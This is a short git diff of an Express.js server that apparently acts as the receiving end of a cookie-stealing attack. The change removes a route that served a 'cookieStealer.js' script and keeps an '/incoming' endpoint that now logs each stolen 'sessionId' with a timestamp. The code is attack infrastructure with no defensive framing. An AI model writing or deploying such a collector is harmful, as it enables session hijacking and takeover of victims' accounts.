@@ -8,13 +8,9 @@ app.use(bodyParser.urlencoded())
 app.use(bodyParser.json())
 app.use('/static', express.static('public'))
 
-app.get("/", (req,res) => {
-    res.sendFile(process.cwd () + '/public/cookieStealer.js')
-})
-
 app.get("/incoming", (req,res) => {
     let { sessionId } = req.query 
-    console.log(sessionId)
+    console.log(+new Date() + ' : ' + sessionId)
     res.send({ "status": 200, "message": 'Received data.' })
 })
 
